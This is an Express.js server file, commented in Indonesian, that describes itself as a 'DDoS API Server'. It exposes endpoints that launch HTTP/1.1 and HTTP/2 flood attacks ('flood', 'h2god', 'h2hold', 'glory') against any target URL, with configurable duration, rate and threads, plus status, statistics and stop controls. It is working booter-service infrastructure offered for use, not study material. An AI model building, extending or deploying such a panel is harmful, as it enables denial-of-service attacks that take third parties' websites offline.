const express = require('express');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');

// Fix untuk Node.js 24 - bodyParser sudah built-in di Express
const app = express();

// Middleware untuk Node.js 24
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Security headers
app.use((req, res, next) => {
  res.setHeader('X-Powered-By', 'DDoS API Server');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  next();
});

// Serve static files
app.use(express.static(path.join(__dirname, '../public'), {
  maxAge: '1h',
  etag: true
}));

// Import AttackManager
const AttackManager = require('../lib/attackManager');
const attackManager = new AttackManager();

// Rate limiting yang compatible dengan Node.js 24
const rateLimit = require('express-rate-limit');
const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 300000,
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 10,
  standardHeaders: 'draft-7',
  legacyHeaders: false,
  skip: (req) => req.path === '/api/status' || req.path === '/api/stats',
  message: {
    success: false,
    error: 'Too many requests, please try again later',
    retryAfter: 300
  },
  handler: (req, res, next, options) => {
    res.status(429).json(options.message);
  }
});

// Home page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

// API Routes - FIXED untuk Node.js 24
app.get('/api/flood', limiter, async (req, res) => {
  try {
    const { target, duration } = req.query;
    
    // Validation
    if (!target || !duration) {
      return res.status(400).json({
        success: false,
        error: 'Parameter target dan duration diperlukan'
      });
    }

    // URL validation
    try {
      new URL(target);
    } catch {
      return res.status(400).json({
        success: false,
        error: 'URL target tidak valid'
      });
    }

    if (!attackManager.canStartAttack()) {
      return res.status(429).json({
        success: false,
        error: 'Server is busy, please try again later',
        queuePosition: attackManager.getQueueLength()
      });
    }

    const attackId = uuidv4();
    
    // Start attack in background
    setTimeout(async () => {
      try {
        await attackManager.executeAttack('flood', attackId, [target, duration], 
          parseInt(duration) * 1000 + 5000);
      } catch (error) {
        console.error(`Attack ${attackId} failed:`, error.message);
      }
    }, 0);

    res.json({
      success: true,
      method: 'flood',
      target: target,
      duration: duration,
      attackId: attackId,
      message: 'Attack launched successfully',
      estimatedTime: `${duration} seconds`
    });
  } catch (error) {
    console.error('Flood attack error:', error);
    res.status(500).json({
      success: false,
      error: 'Internal server error',
      message: error.message
    });
  }
});

app.get('/api/flood1', limiter, async (req, res) => {
  try {
    const { target, duration } = req.query;
    
    if (!target || !duration) {
      return res.status(400).json({
        success: false,
        error: 'Parameter target dan duration diperlukan'
      });
    }

    try {
      new URL(target);
    } catch {
      return res.status(400).json({
        success: false,
        error: 'URL target tidak valid'
      });
    }

    if (!attackManager.canStartAttack()) {
      return res.status(429).json({
        success: false,
        error: 'Server is busy, please try again later'
      });
    }

    const attackId = uuidv4();
    
    setTimeout(async () => {
      try {
        await attackManager.executeAttack('flood1', attackId, [target, duration], 
          parseInt(duration) * 1000 + 5000);
      } catch (error) {
        console.error(`Attack ${attackId} failed:`, error.message);
      }
    }, 0);

    res.json({
      success: true,
      method: 'flood1',
      target: target,
      duration: duration,
      attackId: attackId,
      message: 'Attack launched successfully'
    });
  } catch (error) {
    console.error('Flood1 attack error:', error);
    res.status(500).json({
      success: false,
      error: 'Internal server error'
    });
  }
});

app.get('/api/h2god', limiter, async (req, res) => {
  try {
    const { target, time, rate, threads } = req.query;
    
    if (!target || !time || !rate || !threads) {
      return res.status(400).json({
        success: false,
        error: 'Parameter target, time, rate, dan threads diperlukan'
      });
    }

    try {
      new URL(target);
    } catch {
      return res.status(400).json({
        success: false,
        error: 'URL target tidak valid'
      });
    }

    if (!attackManager.canStartAttack()) {
      return res.status(429).json({
        success: false,
        error: 'Server is busy, please try again later'
      });
    }

    const attackId = uuidv4();
    const params = [target, time, rate, threads];
    
    setTimeout(async () => {
      try {
        await attackManager.executeAttack('h2god', attackId, params, 
          parseInt(time) * 1000 + 5000);
      } catch (error) {
        console.error(`Attack ${attackId} failed:`, error.message);
      }
    }, 0);

    res.json({
      success: true,
      method: 'h2god',
      target: target,
      time: time,
      rate: rate,
      threads: threads,
      attackId: attackId,
      message: 'Attack launched successfully'
    });
  } catch (error) {
    console.error('H2God attack error:', error);
    res.status(500).json({
      success: false,
      error: 'Internal server error'
    });
  }
});

app.get('/api/h2hold', limiter, async (req, res) => {
  try {
    const { target, time, rate, threads } = req.query;
    
    if (!target || !time || !rate || !threads) {
      return res.status(400).json({
        success: false,
        error: 'Parameter target, time, rate, dan threads diperlukan'
      });
    }

    try {
      new URL(target);
    } catch {
      return res.status(400).json({
        success: false,
        error: 'URL target tidak valid'
      });
    }

    if (!attackManager.canStartAttack()) {
      return res.status(429).json({
        success: false,
        error: 'Server is busy, please try again later'
      });
    }

    const attackId = uuidv4();
    const params = [target, time, rate, threads];
    
    setTimeout(async () => {
      try {
        await attackManager.executeAttack('h2-hold', attackId, params, 
          parseInt(time) * 1000 + 5000);
      } catch (error) {
        console.error(`Attack ${attackId} failed:`, error.message);
      }
    }, 0);

    res.json({
      success: true,
      method: 'h2hold',
      target: target,
      time: time,
      rate: rate,
      threads: threads,
      attackId: attackId,
      message: 'Attack launched successfully'
    });
  } catch (error) {
    console.error('H2Hold attack error:', error);
    res.status(500).json({
      success: false,
      error: 'Internal server error'
    });
  }
});

app.get('/api/glory', limiter, async (req, res) => {
  try {
    const { target, time, rate, threads } = req.query;
    
    if (!target || !time || !rate || !threads) {
      return res.status(400).json({
        success: false,
        error: 'Parameter target, time, rate, dan threads diperlukan'
      });
    }

    try {
      new URL(target);
    } catch {
      return res.status(400).json({
        success: false,
        error: 'URL target tidak valid'
      });
    }

    if (!attackManager.canStartAttack()) {
      return res.status(429).json({
        success: false,
        error: 'Server is busy, please try again later'
      });
    }

    const attackId = uuidv4();
    const params = [target, time, rate, threads];
    
    setTimeout(async () => {
      try {
        await attackManager.executeAttack('glory', attackId, params, 
          parseInt(time) * 1000 + 5000);
      } catch (error) {
        console.error(`Attack ${attackId} failed:`, error.message);
      }
    }, 0);

    res.json({
      success: true,
      method: 'glory',
      target: target,
      time: time,
      rate: rate,
      threads: threads,
      attackId: attackId,
      message: 'Attack launched successfully'
    });
  } catch (error) {
    console.error('Glory attack error:', error);
    res.status(500).json({
      success: false,
      error: 'Internal server error'
    });
  }
});

app.get('/api/methods', (req, res) => {
  const methods = [
    {
      name: 'flood',
      description: 'Metode Flood dasar menggunakan HTTP/1.1',
      parameters: ['target', 'duration'],
      endpoint: '/api/flood',
      example: '/api/flood?target=https://example.com&duration=60'
    },
    {
      name: 'flood1',
      description: 'Metode Flood tingkat tinggi dengan multi-threading',
      parameters: ['target', 'duration'],
      endpoint: '/api/flood1',
      example: '/api/flood1?target=https://example.com&duration=60'
    },
    {
      name: 'h2god',
      description: 'Metode HTTP/2 God dengan multiplexing',
      parameters: ['target', 'time', 'rate', 'threads'],
      endpoint: '/api/h2god',
      example: '/api/h2god?target=https://example.com&time=60&rate=100&threads=10'
    },
    {
      name: 'h2hold',
      description: 'Metode HTTP/2 Hold dengan connection persistence',
      parameters: ['target', 'time', 'rate', 'threads'],
      endpoint: '/api/h2hold',
      example: '/api/h2hold?target=https://example.com&time=60&rate=100&threads=10'
    },
    {
      name: 'glory',
      description: 'Metode Glory dengan advanced techniques',
      parameters: ['target', 'time', 'rate', 'threads'],
      endpoint: '/api/glory',
      example: '/api/glory?target=https://example.com&time=60&rate=100&threads=10'
    }
  ];
  
  res.json({
    success: true,
    timestamp: new Date().toISOString(),
    server: {
      nodeVersion: process.version,
      maxConcurrent: attackManager.maxConcurrent,
      activeAttacks: attackManager.getActiveCount(),
      available: attackManager.canStartAttack()
    },
    methods: methods,
    limits: {
      rateLimit: process.env.RATE_LIMIT_MAX_REQUESTS || 10,
      window: '5 minutes',
      maxDuration: '300 seconds'
    }
  });
});

app.get('/api/status', (req, res) => {
  const scriptNames = ['flood', 'flood1', 'h2god', 'h2-hold', 'glory'];
  const scriptData = [];
  
  scriptNames.forEach(name => {
    const scriptPath = path.join(__dirname, '../lib/scripts', `${name}.js`);
    const exists = fs.existsSync(scriptPath);
    
    scriptData.push({
      name: name,
      exists: exists,
      ready: exists ? 'Yes' : 'No'
    });
  });
  
  const activeAttacks = attackManager.getAllAttacks();
  
  res.json({
    success: true,
    timestamp: new Date().toISOString(),
    server: {
      status: 'running',
      nodeVersion: process.version,
      uptime: Math.floor(process.uptime()),
      memory: {
        used: Math.round(process.memoryUsage().heapUsed / 1024 / 1024),
        total: Math.round(process.memoryUsage().heapTotal / 1024 / 1024)
      }
    },
    attacks: {
      active: attackManager.getActiveCount(),
      max: attackManager.maxConcurrent,
      available: attackManager.canStartAttack(),
      list: activeAttacks
    },
    scripts: scriptData
  });
});

app.get('/api/stats', (req, res) => {
  const stats = attackManager.getStats();
  const memoryUsage = process.memoryUsage();
  
  res.json({
    success: true,
    timestamp: new Date().toISOString(),
    attackStats: stats,
    system: {
      memory: {
        rss: Math.round(memoryUsage.rss / 1024 / 1024),
        heapUsed: Math.round(memoryUsage.heapUsed / 1024 / 1024),
        heapTotal: Math.round(memoryUsage.heapTotal / 1024 / 1024),
        external: Math.round(memoryUsage.external / 1024 / 1024)
      },
      uptime: Math.floor(process.uptime()),
      node: process.version,
      platform: process.platform
    }
  });
});

app.post('/api/stop', (req, res) => {
  try {
    const { attackId } = req.body;
    
    if (!attackId) {
      return res.status(400).json({
        success: false,
        error: 'attackId diperlukan'
      });
    }
    
    const stopped = attackManager.removeAttack(attackId);
    
    res.json({
      success: stopped,
      message: stopped ? `Attack ${attackId} berhasil dihentikan` : `Attack ${attackId} tidak ditemukan`,
      attackId: attackId
    });
  } catch (error) {
    console.error('Stop attack error:', error);
    res.status(500).json({
      success: false,
      error: 'Internal server error'
    });
  }
});

// Serve assets
app.get('/assets/:file', (req, res) => {
  const filePath = path.join(__dirname, '../assets', req.params.file);
  if (fs.existsSync(filePath)) {
    res.sendFile(filePath);
  } else {
    res.status(404).json({ success: false, error: 'File not found' });
  }
});

// Error handling untuk Node.js 24
app.use((err, req, res, next) => {
  console.error('Server Error:', {
    message: err.message,
    stack: err.stack,
    url: req.url,
    method: req.method,
    timestamp: new Date().toISOString()
  });
  
  res.status(500).json({
    success: false,
    error: 'Internal Server Error',
    timestamp: new Date().toISOString(),
    requestId: req.id || uuidv4()
  });
});

// Handle 404
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: 'Endpoint tidak ditemukan',
    path: req.path,
    timestamp: new Date().toISOString()
  });
});

// Health check untuk Vercel
app.get('/health', (req, res) => {
  res.status(200).json({
    status: 'healthy',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    memory: process.memoryUsage()
  });
});

// Export untuk Vercel
module.exports = app;
